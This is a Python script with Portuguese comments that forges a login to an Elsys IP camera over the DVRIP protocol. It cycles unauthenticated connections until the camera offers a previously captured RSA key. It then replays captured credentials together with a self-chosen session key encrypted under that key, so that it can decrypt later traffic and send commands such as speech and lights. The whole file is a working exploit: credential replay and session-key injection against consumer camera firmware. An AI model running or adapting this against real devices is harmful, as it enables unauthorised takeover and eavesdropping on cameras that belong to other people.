# -*- coding: utf-8 -*-
"""
ferramentas/forja_login_elsys.py  -  Login FORJADO com chave de sessao nossa.

Descobertas:
 - a camera reveza um punhado de chaves RSA (uma no 1414 de cada conexao);
 - a chave da captura ("E1A7...", md5 do 1414 = c3d5...) AINDA aparece no revezamento;
 - usuario/senha capturados sao validos pra essa chave;
 - o login vai em TEXTO PURO (JSON+\\x00) com o cabecalho usando a sessao do 1414.

Entao: abrimos conexoes (SEM login = seguro) ate cair na chave da captura; nessa
conexao mandamos usuario/senha capturados + uma CommunicateKey NOSSA (cifrada com
a chave da captura, que temos). O login valida e a sessao passa a usar a NOSSA
chave -> a partir daqui da pra cifrar/decifrar os comandos (falar, luz).

RSA em Python puro (sem instalar nada). So UM login, e com credencial valida
(sem risco de 203/205).

Uso (INICIAR_SESSAO.bat fechado):  python ferramentas\\forja_login_elsys.py
"""
import hashlib, json, os, socket, struct, time

CAM_IP = "192.168.3.119"
PORTA = 34567
PASTA = os.path.dirname(os.path.abspath(__file__))
ARQ_ABRE = os.path.join(PASTA, "elsys_abre_1413.bin")
ARQ_MAT = os.path.join(PASTA, "elsys_material.json")
ARQ_KEY = os.path.join(PASTA, "elsys_sessionkey.txt")

ALVO_MD5 = "c3d5cb9dab71dfcc8e40829b1b12658d"   # 1414 da chave da captura (E1A7)
NOSSA_K = b"ABCDEF0123456789"                    # nossa chave de sessao (16 bytes)
MAX_CONEXOES = 25


def recv_frame(sock, timeout=4):
    sock.settimeout(timeout)
    cab = b""
    try:
        while len(cab) < 20:
            ch = sock.recv(20 - len(cab))
            if not ch:
                return None, 0, b""
            cab += ch
    except (socket.timeout, OSError):
        return None, 0, b""
    sess = struct.unpack_from("<I", cab, 4)[0]
    mid = struct.unpack_from("<H", cab, 14)[0]
    tam = struct.unpack_from("<I", cab, 16)[0]
    corpo = b""
    while len(corpo) < tam:
        try:
            ch = sock.recv(min(65536, tam - len(corpo)))
        except (socket.timeout, OSError):
            break
        if not ch:
            break
        corpo += ch
    return mid, sess, corpo


def frame(msgid, payload, sessao=0, seq=0):
    cab = bytearray(20)
    cab[0] = 255
    struct.pack_into("<I", cab, 4, sessao)
    struct.pack_into("<I", cab, 8, seq)
    struct.pack_into("<H", cab, 14, msgid)
    struct.pack_into("<I", cab, 16, len(payload))
    return bytes(cab) + payload


def rsa_pkcs1v15(msg, N, e):
    k = (N.bit_length() + 7) // 8
    ps_len = k - 3 - len(msg)
    ps = bytearray()
    while len(ps) < ps_len:
        b = os.urandom(1)
        if b[0] != 0:
            ps.append(b[0])
    em = b"\x00\x02" + bytes(ps) + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), e, N)
    return c.to_bytes(k, "big")


def main():
    mat = json.load(open(ARQ_MAT))
    mod_hex, exp_hex = mat["PublicKey"].split(",")
    N = int(mod_hex, 16)
    e = int(exp_hex, 16)
    abre_raw = open(ARQ_ABRE, "rb").read()

    ck_hex = rsa_pkcs1v15(NOSSA_K, N, e).hex().upper()
    login = {"EncryptType": "MD5", "LoginType": "DVRIP-FutureHome",
             "UserName": mat["UserName_rsa"], "PassWord": mat["PassWord_rsa"],
             "CommunicateKey": ck_hex}
    login_bytes = json.dumps(login, separators=(",", ":")).encode() + b"\x00"

    print("=" * 62)
    print(" FORJA LOGIN ELSYS  (cacando a chave da captura, md5 %s...)" % ALVO_MD5[:8])
    print("=" * 62)

    sock = None
    s14 = None
    for i in range(1, MAX_CONEXOES + 1):
        try:
            s = socket.create_connection((CAM_IP, PORTA), timeout=6)
        except OSError as ex:
            print("  conexao %d: nao conectou (%s)" % (i, ex))
            time.sleep(1)
            continue
        s.sendall(abre_raw)
        achou = False
        for _ in range(4):
            mid, sess, corpo = recv_frame(s, 3)
            if mid is None:
                break
            if mid == 1414:
                md5 = hashlib.md5(corpo.rstrip(b"\x00\r\n ")).hexdigest()
                marca = "  <<< CHAVE DA CAPTURA!" if md5 == ALVO_MD5 else ""
                print("  conexao %2d: 1414 md5=%s%s" % (i, md5[:12], marca))
                if md5 == ALVO_MD5:
                    sock, s14, achou = s, sess, True
                break
        if achou:
            break
        s.close()
        time.sleep(0.6)

    if sock is None:
        print("\n[X] A chave da captura nao apareceu em %d conexoes." % MAX_CONEXOES)
        print("    Pode ter saido do revezamento. Rode de novo; se insistir em")
        print("    nao aparecer, a gente parte pro reset ou pro ESP32.")
        return

    print("\n  [i] peguei a conexao certa (sessao 1414 = 0x%X). Mandando login forjado..." % s14)
    try:
        sock.sendall(frame(1000, login_bytes, sessao=s14))
        ret, sid = None, None
        for _ in range(5):
            mid, sess, corpo = recv_frame(sock, 6)
            if mid is None:
                break
            if mid == 1001:
                txt = corpo.rstrip(b"\x00\r\n ").decode("utf-8", "replace")
                print("  login 1001:", txt[:200])
                try:
                    j = json.loads(txt)
                    ret, sid = j.get("Ret"), j.get("SessionID")
                except Exception:
                    pass
                break
        print("-" * 62)
        if ret == 100:
            open(ARQ_KEY, "w").write("%s\n%s\n" % (NOSSA_K.decode(), sid))
            print("[OK] >>> LOGIN FORJADO ACEITO! Ret 100, SessionID=%s <<<" % sid)
            print("     A sessao usa a NOSSA chave (%s). Guardei em elsys_sessionkey.txt." % NOSSA_K.decode())
            print("     Proximo passo: decifrar a sessao (AES) e mandar falar/luz.")
        elif ret == 203:
            print("[X] Ret 203 - a chave bateu mas a credencial nao validou (inesperado).")
        else:
            print("[?] Ret %s - me manda a saida." % ret)
    finally:
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
